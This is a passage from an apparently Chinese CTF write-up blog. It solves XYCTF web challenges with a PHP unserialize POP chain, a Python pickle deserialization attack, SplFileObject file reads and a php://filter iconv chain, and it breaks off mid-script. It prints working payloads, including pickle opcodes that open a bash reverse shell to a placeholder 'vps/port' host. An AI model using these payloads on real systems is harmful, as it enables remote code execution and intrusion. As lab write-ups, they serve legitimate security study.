class="variable">$chen</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">E</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;num=<span class="keyword">new</span> <span class="title function_ invoke__">D</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;num-&gt;lao=<span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;num-&gt;lao-&gt;luo=<span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;num-&gt;lao-&gt;luo-&gt;mack=<span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//O:1:&quot;E&quot;:2:&#123;s:4:&quot;name&quot;;N;s:3:&quot;num&quot;;O:1:&quot;D&quot;:2:&#123;s:3:&quot;lao&quot;;O:1:&quot;B&quot;:1:&#123;s:3:&quot;luo&quot;;O:1:&quot;A&quot;:1:&#123;s:4:&quot;mack&quot;;O:1:&quot;C&quot;:1:&#123;s:5:&quot;wang1&quot;;N;&#125;&#125;&#125;s:4:&quot;chen&quot;;N;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>访问<code>/saber_master_saber_master.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Liu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$T1ng</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$upsw1ng</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$Liu</span>, <span class="variable">$T1ng</span>, <span class="variable">$upsw1ng</span> = Showmaker</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Liu = <span class="variable">$Liu</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;T1ng = <span class="variable">$T1ng</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;upsw1ng = <span class="variable">$upsw1ng</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$crypto0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$adwa</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$crypto0</span>, <span class="variable">$adwa</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;crypto0 = <span class="variable">$crypto0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">XYCTF</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;adwa-&gt;crypto0 != <span class="string">&#x27;dev1l&#x27;</span> <span class="keyword">or</span> <span class="variable language_">$this</span>-&gt;adwa-&gt;T1ng != <span class="string">&#x27;yuroandCMD258&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> False;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> True;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO3</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$KickyMu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fpclose</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$N1ght</span> = <span class="string">&quot;Crypto0&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$KickyMu</span>, <span class="variable">$fpclose</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;KickyMu = <span class="variable">$KickyMu</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fpclose = <span class="variable">$fpclose</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">XY</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;N1ght == <span class="string">&#x27;oSthing&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;WOW, You web is really good!!!\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$_POST</span>[<span class="string">&#x27;X&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;Y&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;KickyMu-&gt;<span class="title function_ invoke__">XYCTF</span>()) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">XY</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;CTF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;CTF&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>链子：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">XYCTFNO3</span><span class="symbol">:</span><span class="symbol">:__wakeup-&gt;XYCTFNO2</span><span class="symbol">:</span><span class="symbol">:XYCTF</span>()-&gt;<span class="variable constant_">XYCTFNO3</span><span class="symbol">:</span><span class="symbol">:XY</span>()</span><br></pre></td></tr></table></figure><p><code>$_POST[&#39;X&#39;]($_POST[&#39;Y&#39;]);</code>是利用点，用php的内置类SplFileObject来读取文件内容，由于没有输出，想要读取到文件里的内容要用伪协议，他毕竟说了flag.php，直接读就行了。</p><p>&#x3D;&#x3D;XYCTFNO1类的upsw1ng为私有变量，因为这里没有对其进行赋值，序列化后的字符串和它无关，所以不用管，但如果对其进行了赋值，因为是私有变量，序列化后变量中的类名前后会有空白符，而复制的时候会丢失，所以要在类名前后加上%00或者将其序列化后的字符串进行url编码&#x3D;&#x3D;</p><p>poc：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="string">?p</span>hp</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">XYCTFNO1</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Liu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$T1ng</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$upsw1ng</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">XYCTFNO2</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$crypto0</span>=<span class="string">&quot;dev1l&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$adwa</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$T1ng</span>=<span class="string">&quot;yuroandCMD258&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">XYCTFNO3</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$KickyMu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fpclose</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$N1ght</span> = <span class="string">&quot;oSthing&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=new <span class="variable constant_">XYCTFNO3</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title class_">KickyMu</span>=new <span class="variable constant_">XYCTFNO2</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title class_">KickyMu</span>-&gt;adwa=new <span class="variable constant_">XYCTFNO2</span>();</span><br><span class="line">echo urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span><span class="symbol">O:</span><span class="number">8</span><span class="symbol">:<span class="string">&quot;XYCTFNO3&quot;</span></span><span class="symbol">:</span><span class="number">3</span><span class="symbol">:</span>&#123;<span class="symbol">s:</span><span class="number">7</span><span class="symbol">:<span class="string">&quot;KickyMu&quot;</span></span>;<span class="symbol">O:</span><span class="number">8</span><span class="symbol">:<span class="string">&quot;XYCTFNO2&quot;</span></span><span class="symbol">:</span><span class="number">3</span><span class="symbol">:</span>&#123;<span class="symbol">s:</span><span class="number">7</span><span class="symbol">:<span class="string">&quot;crypto0&quot;</span></span>;<span class="symbol">s:</span><span class="number">5</span><span class="symbol">:<span class="string">&quot;dev1l&quot;</span></span>;<span class="symbol">s:</span><span class="number">4</span><span class="symbol">:<span class="string">&quot;adwa&quot;</span></span>;<span class="symbol">O:</span><span class="number">8</span><span class="symbol">:<span class="string">&quot;XYCTFNO2&quot;</span></span><span class="symbol">:</span><span class="number">3</span><span class="symbol">:</span>&#123;<span class="symbol">s:</span><span class="number">7</span><span class="symbol">:<span class="string">&quot;crypto0&quot;</span></span>;<span class="symbol">s:</span><span class="number">5</span><span class="symbol">:<span class="string">&quot;dev1l&quot;</span></span>;<span class="symbol">s:</span><span class="number">4</span><span class="symbol">:<span class="string">&quot;adwa&quot;</span></span>;N;<span class="symbol">s:</span><span class="number">4</span><span class="symbol">:<span class="string">&quot;T1ng&quot;</span></span>;<span class="symbol">s:</span><span class="number">13</span><span class="symbol">:<span class="string">&quot;yuroandCMD258&quot;</span></span>;&#125;<span class="symbol">s:</span><span class="number">4</span><span class="symbol">:<span class="string">&quot;T1ng&quot;</span></span>;<span class="symbol">s:</span><span class="number">13</span><span class="symbol">:<span class="string">&quot;yuroandCMD258&quot;</span></span>;&#125;<span class="symbol">s:</span><span class="number">7</span><span class="symbol">:<span class="string">&quot;fpclose&quot;</span></span>;N;<span class="symbol">s:</span><span class="number">5</span><span class="symbol">:<span class="string">&quot;N1ght&quot;</span></span>;<span class="symbol">s:</span><span class="number">7</span><span class="symbol">:<span class="string">&quot;oSthing&quot;</span></span>;&#125;</span><br></pre></td></tr></table></figure><p>故最终payload：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET传参:</span><br><span class="line">?CTF=O:<span class="number">8</span>:<span class="string">&quot;XYCTFNO3&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;KickyMu&quot;</span>;O:<span class="number">8</span>:<span class="string">&quot;XYCTFNO2&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;crypto0&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;dev1l&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;adwa&quot;</span>;O:<span class="number">8</span>:<span class="string">&quot;XYCTFNO2&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;crypto0&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;dev1l&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;adwa&quot;</span>;N;s:<span class="number">4</span>:<span class="string">&quot;T1ng&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;yuroandCMD258&quot;</span>;&#125;s:<span class="number">4</span>:<span class="string">&quot;T1ng&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;yuroandCMD258&quot;</span>;&#125;s:<span class="number">7</span>:<span class="string">&quot;fpclose&quot;</span>;N;s:<span class="number">5</span>:<span class="string">&quot;N1ght&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;oSthing&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line">POST传参:</span><br><span class="line">X=SplFileObject&amp;Y=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h3 id="login（pickle反序列化）"><a href="#login（pickle反序列化）" class="headerlink" title="login（pickle反序列化）"></a>login（pickle反序列化）</h3><p><img src="https://img2.imgtp.com/2024/04/29/BXqBsGGn.png" alt="image-20240414134841575.png"></p><p>扫下目录发现有<code>register.php</code>，用于注册的，我注册了个账号密码都为1的，进去后</p><p><img src="https://img2.imgtp.com/2024/04/29/vB1pIv6C.png" alt="image-20240414134937941.png"></p><p>当时第一反应是看到hello world以为是ssti，然后测了下发现不是，然后注册用户名测waf，发现用户名为大小写r的时候，弹waf，说明过滤了大小写r</p><p><img src="https://img2.imgtp.com/2024/04/29/sgjGaG2d.png" alt="image-20240414135132072.png"></p><p>很奇怪，所有数字字母就只过滤了r，这时没啥思路就抓了个包，发现cookie好像有东西</p><p><img src="https://img2.imgtp.com/2024/04/29/e530Go1Z.png" alt="image-20240414135327458.png"></p><p>把这个remember的值丢给gpt，gpt说这个字符串像是pickle反序列化后的字符串，但pickle反序列化不成功。想到之前只过滤了r，而刚好pickle反序列化中关于函数执行有三个重要的字节码：<code>R</code>、<code>i</code>、<code>o</code>中就有r，猜测remember的值就是pickle反序列化的入口</p><p>这里没有回显的地方，就想到用shell反弹，先是一个最基础的shell反弹，这个是R指令的</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span><span class="string">&#x27;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&quot;bash -c &#x27;</span>bash -i &gt;&amp; <span class="regexp">/dev/tcp</span><span class="regexp">/vps/port</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span><span class="string">&#x27;&quot;</span></span><br><span class="line"><span class="string">tR.</span></span><br></pre></td></tr></table></figure><p>上面测试是过滤了R的，用R指令也弹不了，那就换个指令，用i指令</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;(S&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/vps/port 0&gt;&amp;1&#x27;&quot;</span></span><br><span class="line"><span class="string">ios</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>还要base64编码下，毕竟人家那remember的值都是base64编码后的，估计后端语句还要进行一次base64转换，我看其他类似的ctf题都是base64解码后就能pickle反序列化成功</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">a=<span class="string">&#x27;&#x27;&#x27;(S&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/vps/port 0&gt;&amp;1&#x27;&quot;</span></span><br><span class="line"><span class="string">ios</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(a.encode()))</span><br></pre></td></tr></table></figure><p>得到的结果要把b字节码和单引号去掉，成功弹shell</p><p><img src="https://img2.imgtp.com/2024/04/29/jzVhMoJg.png" alt="image-20240416230752762.png"></p><h3 id="ezClass（原生类SplFileObject读文件）"><a href="#ezClass（原生类SplFileObject读文件）" class="headerlink" title="ezClass（原生类SplFileObject读文件）"></a>ezClass（原生类SplFileObject读文件）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$aa</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;aa&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$bb</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;bb&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">((<span class="keyword">new</span> <span class="variable">$a</span>(<span class="variable">$aa</span>))-&gt;<span class="variable">$c</span>())((<span class="keyword">new</span> <span class="variable">$b</span>(<span class="variable">$bb</span>))-&gt;<span class="variable">$c</span>());</span><br></pre></td></tr></table></figure><p>本来想用原生类<code>DirectoryIterator</code>加glob协议遍历数组先看下当前目录的，但没法遍历，只能说运气好，flag就在名为flag的文件下，万一改个名字就寄，但其实<code>DirectoryIterator</code>加glob协议可以知道确实有个名为flag的文件</p><p><img src="https://img2.imgtp.com/2024/04/29/79gWyXte.png" alt="image-20240415181248957.png"></p><p>毕竟如果不存在的话都不会回显的，比如a</p><p><img src="https://img2.imgtp.com/2024/04/29/YVnVhEc3.png" alt="image-20240415181504316.png"></p><p>payload</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=SplFileObject<span class="variable">&amp;aa</span>=/flag<span class="variable">&amp;c</span>=__toString</span><br></pre></td></tr></table></figure><h3 id="连连看到底是连连什么看（PHP-Base64-Filter构造rce）"><a href="#连连看到底是连连什么看（PHP-Base64-Filter构造rce）" class="headerlink" title="连连看到底是连连什么看（PHP Base64 Filter构造rce）"></a>连连看到底是连连什么看（PHP Base64 Filter构造rce）</h3><p>开题看源码啥都没有，附件有个<code>what&#39;s_this.php</code>，访问一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http|=|php|file|:|\/|\?/i&quot;</span>, <span class="variable">$p</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;waf!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span>=<span class="string">&quot;php://filter/<span class="subst">$p</span>/resource=/etc/passwd&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$payload</span>)===<span class="string">&quot;XYCTF&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这里要求的是读<code>/etc/passwd</code>文件，并且文件的内容要为<code>XYCTF</code>。所以我们就需要构造这个文件的内容为XYCTF，参考文章：<a href="https://tttang.com/archive/1395/">https://tttang.com/archive/1395/</a></p><p>这篇文章大概意思就是可以利用 PHP Base64 Filter 宽松的解析，通过 iconv filter 等编码组合构造出特定的 PHP 代码进而完成无需<strong>临时文件</strong>的 RCE。</p><p>PHP Filter 当中有一种 <code>convert.iconv</code> 的 Filter ，可以用来将数据从字符集 A 转换为字符集 B ，其中这两个字符集可以从 <code>iconv -l</code> 获得，而从一个字符集转换为另一个子符集时，由于编码规则不同，转换前后的字符有可能就会不同，就可能会产生一些原字符串没有的字符，例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;php://filter/convert.iconv.UTF-8%2fUTF-7/resource=data:,some&lt;&gt;text&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="comment">// Output:</span></span><br><span class="line"><span class="comment">// some+ADwAPg-text</span></span><br></pre></td></tr></table></figure><p>甚至是不可见字符，例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;php://filter/&quot;</span>;</span><br><span class="line"><span class="variable">$url</span> .= <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR&quot;</span>;</span><br><span class="line"><span class="variable">$url</span> .= <span class="string">&quot;/resource=data://,aaaaaaaaaaaaaa&quot;</span>;     <span class="comment">//我们这里简单使用 `data://` 来模拟文件内容读取，相当于题上的/etc/passwd</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>));</span><br><span class="line"><span class="comment">// Output:</span></span><br><span class="line"><span class="comment">// string(18) &quot;.$)Caaaaaaaaaaaaaa&quot;</span></span><br></pre></td></tr></table></figure><p>这个<code>UTF8.CSISO2022KR</code>编码形式产生的字符串里面，<code>.$)</code>其实是不可见字符（试过就知道），对于 PHP Base64 来说是非法字符，所以接下来我们只需要 base64-decode  一下就可以去掉不可见字符了，但是与此同时，我们的 C 字符也被 base64-decode 解码了，这时候我们需要再把解码结果使用一次  base64-encode 即可还原回来原来的 C 字符了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;php://filter/&quot;</span>;</span><br><span class="line"><span class="variable">$url</span> .= <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR&quot;</span>;</span><br><span class="line"><span class="variable">$url</span> .= <span class="string">&quot;|convert.base64-decode&quot;</span>;</span><br><span class="line"><span class="variable">$url</span> .= <span class="string">&quot;/resource=data://,aaaaaaaaaaaaaa&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Output:</span></span><br><span class="line"><span class="comment">// string(11) &quot;...i..i..i.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;php://filter/&quot;</span>;</span><br><span class="line"><span class="variable">$url</span> .= <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR&quot;</span>;</span><br><span class="line"><span class="variable">$url</span> .= <span class="string">&quot;|convert.base64-decode|convert.base64-encode&quot;</span>;</span><br><span class="line"><span class="variable">$url</span> .= <span class="string">&quot;/resource=data://,aaaaaaaaaaaaaa&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Output:</span></span><br><span class="line"><span class="comment">// string(12) &quot;Caaaaaaaaaaa&quot;</span></span><br></pre></td></tr></table></figure><p>这样我们就能构造出自己想要的字符串了，脚本：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span 